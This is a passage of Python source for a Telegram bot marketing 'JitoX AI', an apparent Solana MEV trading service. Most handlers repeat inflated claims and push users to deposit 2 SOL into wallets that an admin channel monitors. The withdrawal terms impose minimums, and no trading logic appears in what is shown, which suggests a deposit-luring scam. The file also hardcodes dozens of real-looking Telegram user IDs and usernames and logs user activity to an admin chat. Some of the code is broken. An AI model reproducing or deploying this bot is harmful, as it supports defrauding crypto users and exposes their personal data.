            "👾 <b>JitoX AI - Dynamic Risk Matrix</b> 👾\n\n"
            "💎 <b>Advanced Risk Intelligence</b>\n\n"
            "️ <b>Adaptive Risk Protocols</b>\n"
            "• Real-time exposure management\n"
            "• Dynamic threshold optimization\n"
            "• Institutional risk modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Automated risk calibration\n"
            "⚔️ Strategic loss prevention\n"
            "⚔️ Advanced profit maximization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk adaptation ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def strategy_sharing(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Network Matrix</b> 👾\n\n"
            "💎 <b>Professional Collaboration Framework</b>\n\n"
            "⚡️ <b>Advanced Network Protocols</b>\n"
            "• Institutional strategy sharing\n"
            "• Professional knowledge exchange\n"
            "• Collaborative performance analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Strategic insight distribution\n"
            "⚔️ Advanced methodology sharing\n"
            "⚔️ Cross-portfolio optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior collaboration drives collective MEV excellence. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Replication Matrix</b> 👾\n\n"
            "💎 <b>Professional Mirroring Framework</b>\n\n"
            "⚡️ <b>Advanced Replication Protocols</b>\n"
            "• Institutional position mirroring\n"
            "• Real-time strategy synchronization\n"
            "• Professional execution matching\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Elite trader selection matrix\n"
            "⚔️ Advanced performance tracking\n"
            "⚔️ Dynamic allocation optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior replication drives consistent MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

# Store previous balances in memory
wallet_balances = {}

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check for balance changes in wallets and send notifications in real-time."""
    logger.info("Starting check_deposits function")
    try:
        for wallet_address in wallet_addresses:
            logger.info(f"Checking balance for wallet {wallet_address}")
            try:
                current_balance = await get_balance(wallet_address)
                logger.info(f"Current balance for {wallet_address}: {current_balance} SOL")
                
                # Get previous balance from memory
                previous_balance = wallet_balances.get(wallet_address, current_balance)
                
                # If there's a change in balance
                if abs(current_balance - previous_balance) >= 0.000001:  # To account for floating-point imprecision
                    change = current_balance - previous_balance
                    change_type = "increase" if change > 0 else "decrease"
                    status_text = "Deposit received ✅" if change > 0 else "Withdrawal processed ✅"
                    
                    message = (
                        f"💎 <b>Balance {change_type} detected!</b> 💎\n\n"
                        f"🔸 Wallet: <code>{wallet_address}</code>\n"
                        f"🔸 Previous: {previous_balance:.4f} SOL\n"
                        f"🔸 Current: {current_balance:.4f} SOL\n"
                        f"🔸 Change: {abs(change):.4f} SOL\n\n"
                        f"⚡️ Status: {status_text}"
                    )
                    
                    # Send notification to admin channel
                    await context.bot.send_message(
                        chat_id=NOTIFICATION_CHAT_ID,
                        text=message,
                        parse_mode='HTML'
                    )
                    logger.info(f"Balance change notification sent for wallet {wallet_address}")
                
                # Update the stored balance in memory
                wallet_balances[wallet_address] = current_balance
                
            except Exception as e:
                logger.error(f"Error checking balance for wallet {wallet_address}: {e}")
    except Exception as e:
        logger.error(f"Error in check_deposits: {e}")
    
    logger.info("Finished check_deposits function")

async def min_deposit_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Capital Framework</b> 👾\n\n"
            "💎 <b>Professional Infrastructure Requirements</b>\n\n"
            "⚡️ <b>2 SOL Initialization Protocol</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Advanced Gas Management: Institutional-grade transaction execution\n"
            "⚔️ Opportunity Matrix: Enhanced MEV capture capabilities\n"
            "⚔️ Risk Framework: Professional position management protocols\n"
            "⚔️ Competitive Edge: Superior market positioning architecture\n"
            "⚔️ Sustainable Performance: Strategic capital optimization\n\n"
            "🛡️ <b>Professional Tiers</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "• Advanced execution protocols\n"
            "• Core MEV capture matrix\n"
            "• Standard performance metrics\n\n"
            "✨ Enhanced Suite: 5+ SOL activation\n"
            "• Priority execution framework\n"
            "• Advanced profit optimization\n"
            "• Institutional feature access\n\n"
            "Professional traders understand: Superior capitalization drives exceptional MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoXAI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_info_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Enterprise MEV Architecture</b> 👾\n\n"
            "💎 <b>Professional Trading Infrastructure</b>\n\n"
            "⚡️ <b>Core Protocol Suite</b>\n\n"
            "🎯 <b>Strategic Entry Protocol</b>\n"
            "⚔️ Advanced listing detection algorithms\n"
            "⚔️ Sub-millisecond execution matrix\n"
            "⚔️ Precision entry optimization\n\n"
            "🎯 <b>Priority Execution Framework</b>\n"
            "⚔️ Real-time mempool intelligence\n"
            "⚔️ Dynamic priority management\n"
            "⚔️ Institutional-grade routing\n\n"
            "🎯 <b>Market Impact Protocol</b>\n"
            "⚔️ Advanced order flow analytics\n"
            "⚔️ Precision timing algorithms\n"
            "⚔️ Maximum value extraction\n\n"
            "🎯 <b>Cross-Venue Arbitrage Suite</b>\n"
            "⚔️ Multi-DEX differential analysis\n"
            "⚔️ Automated execution optimization\n"
            "⚔️ Cross-chain opportunity capture\n\n"
            "🛡️ <b>Professional Framework</b>\n"
            "✨ AI-driven market analysis\n"
            "✨ Continuous execution protocols\n"
            "✨ Self-custodial security architecture\n\n"
            "🔮 <b>Access Tiers</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoXAI for immediate assistance\n\n"
            "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔑 Activate MEV Sniper", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def security_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Security Matrix</b> 👾\n\n"
            "💎 <b>Enterprise Protection Framework</b>\n\n"
            "⚡️ <b>Advanced Security Protocols</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Self-Custodial Framework: Institutional-grade key management\n"
            "⚔️ Smart Contract Security: Advanced audit protocols\n"
            "⚔️ Risk Intelligence: Real-time exposure management\n"
            "⚔️ Operational Transparency: On-chain verification matrix\n"
            "⚔️ Professional Monitoring: 24/7 system surveillance\n\n"
            "🛡️ <b>Security Infrastructure</b>\n"
            "✨ Military-grade encryption protocols\n"
            "✨ Advanced threat detection systems\n"
            "✨ Multi-layer protection architecture\n\n"
            "🔮 <b>Professional Safeguards</b>\n"
            "• Institutional-grade risk management\n"
            "• Strategic position monitoring\n"
            "• Advanced security optimization\n\n"
            "⚡️ <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior security ensures sustainable MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoXAI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑 Secure Your Spot", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def withdraw_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Withdrawal Matrix</b> 👾\n\n"
            "💎 <b>Professional Liquidity Framework</b>\n\n"
            "⚡️ <b>Withdrawal Protocol Suite</b>\n"
            "• Institutional-grade processing\n"
            "• Real-time transaction execution\n"
            "• Advanced security verification\n\n"
            "🎯 <b>Strategic Process</b>\n"
            "⚔️ Access withdrawal interface\n"
            "⚔️ Configure extraction parameters\n"
            "⚔️ Confirm security protocols\n"
            "⚔️ Automated processing matrix\n"
            "⚔️ Direct wallet settlement\n\n"
            "🛡️ <b>Operational Parameters</b>\n"
            "✨ Minimum extraction: 2 SOL\n"
            "✨ Strategic reserve: 2 SOL minimum\n"
            "✨ Network optimization fees apply\n\n"
            "🔮 <b>Professional Advisory</b>\n"
            "• Sustained operations maximize MEV capture\n"
            "• Strategic capital retention recommended\n"
            "• Enhanced Suite benefits (5+ SOL):\n"
            "  - Priority processing protocols\n"
            "  - Optimized fee structure\n\n"
            "Professional traders understand: Superior capital management ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoXAI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def log_user_activity(application, user_id, activity):
    """Log user activity and store new users."""
    admin_chat_id = -4540844698
    try:
        # Get user info
        user = await application.bot.get_chat(user_id)
        username = user.username if user.username else user.first_name
        
        # Store user in CSV
        await store_new_user(user_id, username)
        
        # Send log message
        message = f"User {username} ({user_id}) {activity}"
        await application.bot.send_message(chat_id=admin_chat_id, text=message)
        
    except Exception as e:
        logger.error(f"Failed to log user activity: {e}")

async def store_new_user(user_id: int, username: str = None, first_name: str = None, last_name: str = None):
    try:
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        logger.info(f"Using CSV file at: {csv_file}")
        
        # Check if user exists
        with open(csv_file, 'r', encoding='utf-8') as file:
            if any(str(user_id) in line for line in file):
                return False  # User already exists

        # Store new user
        with open(csv_file, 'a', encoding='utf-8', newline='') as file:
            file.write(f"{user_id},{username or ''},{first_name or ''},{last_name or ''}\n")
            
        # Add to user_data dictionary
        user_data[str(user_id)] = {
            'username': username,
            'first_name': first_name,
            'last_name': last_name
        }
        logger.info(f"Successfully stored new user: {user_id} ({username})")
        return True
    except Exception as e:
        logger.error(f"Error storing new user {user_id}: {str(e)}")
        return False

async def handle_blocked_user(user_id: int):
    try:
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        # Remove from CSV file
        df = pd.read_csv(csv_file)
        df = df[df['user_id'].astype(str) != str(user_id)]
        df.to_csv(csv_file, index=False)
        
        # Remove from user_data dictionary
        if str(user_id) in user_data:
            del user_data[str(user_id)]
            
        logger.info(f"Removed blocked user {user_id}")
    except Exception as e:
        logger.error(f"Error removing blocked user: {str(e)}")

# Initialize user_data at startup
user_data = {}
try:
    csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
    if not os.path.exists(csv_file):
        with open(csv_file, 'w', encoding='utf-8', newline='') as file:
            file.write("user_id,username,first_name,last_name\n")
            logger.info("Created new user_data.csv file with headers")
    
    df = pd.read_csv(csv_file)
    for _, row in df.iterrows():
        user_data[str(row['user_id'])] = {
            'username': row['username'],
            'first_name': row['first_name'],
            'last_name': row['last_name']
        }
    logger.info(f"Loaded {len(user_data)} users from CSV")
except Exception as e:
    logger.error(f"Error loading user data: {str(e)}")

async def track_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def message_read_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def migrate_database():
    """Handle database migrations and updates."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check if earnings column exists in referrals table
            async with db.execute("PRAGMA table_info(referrals)") as cursor:
                columns = await cursor.fetchall()
                has_earnings = any(col[1] == 'earnings' for col in columns)
                
                if not has_earnings:
                    logger.info("Adding earnings column to referrals table")
                    await db.execute('ALTER TABLE referrals ADD COLUMN earnings REAL DEFAULT 0')
                    await db.commit()
            
            # Add any future migrations here
            
            logger.info("Database migration completed successfully")
    except Exception as e:
        logger.error(f"Error during database migration: {e}")
        raise

async def ensure_db_exists():
    """Ensure the database file exists and has the correct structure."""
    try:
        # Create database directory if it doesn't exist
        db_dir = os.path.dirname(REFERRAL_DB_PATH)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir)
            logger.info(f"Created database directory: {db_dir}")
        
        # Initialize database tables
        success = await init_referral_db()
        if not success:
            raise Exception("Failed to initialize database")
        
        # Verify tables exist and have correct structure
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check referral_codes table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referral_codes'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referral_codes table not found")
            
            # Check referrals table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referrals'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referrals table not found")
            
            logger.info("Database structure verified successfully")
        
        # Run any necessary migrations
        await migrate_database()
        
        logger.info("Database initialization completed successfully")
        return True
    except Exception as e:
        logger.error(f"Error ensuring database exists: {e}")
        raise

async def recover_missed_users(application: Application) -> None:
    """Recover users that were missed and add them to the user data file."""
    try:
        # Get existing users from CSV using manual reading to handle corrupted files
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        existing_users = set()
        
        if os.path.exists(csv_file):
            try:
                with open(csv_file, 'r', newline='', encoding='utf-8') as f:
                    next(f)  # Skip header
                    for line in f:
                        try:
                            # Split line and clean values
                            parts = [p.strip() for p in line.strip().split(',')]
                            if parts and parts[0]:  # Check if we have a user_id
                                existing_users.add(parts[0])
                        except Exception as line_error:
                            logger.error(f"Error parsing line in CSV: {line_error}")
                            continue
                logger.info(f"Found {len(existing_users)} existing users in CSV")
            except Exception as e:
                logger.error(f"Error reading CSV file: {e}")
        
        # Send notification about current user count
        admin_chat_id = -4540844698
        try:
            await application.bot.send_message(
                chat_id=admin_chat_id,
                text=f"Current user count in database: {len(existing_users)}\n\nNote: Due to Telegram API limitations, we cannot automatically recover old messages. Please forward any important user interaction messages to this chat manually if needed."
            )
        except Exception as e:
            logger.error(f"Error sending admin notification: {e}")
            
    except Exception as e:
        logger.error(f"Error in recover_missed_users: {e}")
        # Continue bot operation even if recovery fails
        pass

async def add_missed_users():
    """Add missed users to the CSV file."""
    missed_users = [
        (789156333, "Michaelcasel9"),
        (6891153210, "JackyWangg"),
        (7646608198, "Jack"),
        (7065528683, "bluesinz"),
        (6109842687, "SautuBilal"),
        (5745101762, "dertyp999000"),
        (827324156, "codee21"),
        (7274014705, "patriive"),
        (1684979519, "Amit1603349"),
        (7635149853, "Mrxxhere"),
        (583822317, "UltimaWar"),
        (1462369980, "s28decentralized"),
        (363104330, "hokus7"),
        (310071061, "mmdoseh"),
        (1635810851, "c9580"),
        (426310896, "Tasiu37"),
        (595839917, "alexxvinn"),
        (5390584670, "Madjid"),
        (978625466, "IDoIt4ALiving"),
        (5537651609, "Sanjit"),
        (7140115193, "Baronsmiles002"),
        (6915936629, "Trumpsofficiall"),
        (5393695674, "CryptoBell0"),
        (1949836264, "skybucksboy"),
        (931022633, "zackbaharum"),
        (1780810427, "FendiCryptologi"),
        (1138015784, "llausdeo"),
        (2047082463, "CO"),
        (1944531910, "WhoopWho"),
        (7686531227, "SoftwareDev1738"),
        (1058833392, "dobrozloRap"),
        (7823490107, "AnnieBananiee"),
        (7241977064, "morhengrt"),
        (5847009152, "Nylez85"),
        (1391928444, "bisbaik"),
        (5135754228, "yizhiqingwa"),
        (7946234743, "Blitzou"),
        (5255753735, "Bill"),
        (259909408, "mthomas1985"),
        (869946859, "SuhailAhmadLone"),
        (5263460826, "mahmutnurettins"),
        (351094512, "thehorizoner"),
        (1239128550, "Raj"),
        (5804450621, "primeerrr1")
    ]
    
    try:
        # Get the CSV file path
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        
        # Create backup before making changes
        backup_name = f'user_data_backup_{int(time.time())}.csv'
        backup_path = os.path.join(os.path.dirname(csv_file), backup_name)
        shutil.copy2(csv_file, backup_path)
        logger.info(f"Created backup at {backup_path}")
        
        # Read existing users to avoid duplicates
        existing_users = set()
        with open(csv_file, 'r', newline='', encoding='utf-8') as f:
            for line in f:
                try:
                    # Skip header
                    if 'user_id' in line.lower():
                        continue
                    # Split line and clean values
                    parts = [p.strip() for p in line.strip().split(',')]
                    if parts and parts[0]:  # Check if we have a user_id
                        try:
                            user_id = int(parts[0])
                            existing_users.add(user_id)
                        except ValueError:
                            logger.warning(f"Skipping invalid user_id in line: {line}")
                except Exception as e:
                    logger.warning(f"Error parsing line: {line}, error: {e}")
                    continue
        
        logger.info(f"Found {len(existing_users)} existing users")
        
        # Add new users
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        added_count = 0
        
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            for user_id, username in missed_users:
                if user_id not in existing_users:
                    writer.writerow([user_id, username, current_time])
                    added_count += 1
                    existing_users.add(user_id)
                    logger.info(f"Added new user: {user_id} ({username})")
        
        logger.info(f"Successfully added {added_count} new users to the CSV file")
        return added_count
        
    except Exception as e:
        logger.error(f"Error adding missed users: {e}")
        return 0

def main() -> None:
    """Initialize and start the bot."""
    try:
        # Initialize the application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Initialize database
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(ensure_db_exists())
            logger.info("Database initialization completed successfully")
            # Recover missed users
            loop.run_until_complete(recover_missed_users(application))
            # Add missed users from the list
            loop.run_until_complete(add_missed_users())
            logger.info("Added missed users to the database")
        except Exception as e:
            logger.error(f"Failed to initialize database: {e}")
            return  # Exit if database initialization fails
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("get_wallet", get_wallet_command))
        application.add_handler(CommandHandler("mev", mev_command))
        application.add_handler(CommandHandler("intensity", intensity_command))
        application.add_handler(CommandHandler("pool", pool_command))
        application.add_handler(CommandHandler("settings", settings_command))
        application.add_handler(CommandHandler("ca", ca_command))
        application.add_handler(CommandHandler("auto", auto_command))
        application.add_handler(CommandHandler("withdraw", withdraw_command))
        
        application.add_handler(CommandHandler("min_deposit", min_deposit_faq))
        application.add_handler(CommandHandler("mev_info", mev_info_faq))
        application.add_handler(CommandHandler("security", security_faq))
        application.add_handler(CommandHandler("withdraw_faq", withdraw_faq))
        application.add_handler(CommandHandler("eth_wallet", get_eth_wallet))

        # Add callback query handler
        application.add_handler(CallbackQueryHandler(button_handler))

        # Add job for checking deposits
        application.job_queue.run_repeating(check_deposits, interval=60, first=10)

        logger.info("Bot started successfully")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Error in main function: {str(e)}")
        raise

if __name__ == '__main__':
    asyncio.run(main())
    asyncio.run(send_blocked_users_notification())
broadcaster = BroadcastSystem()

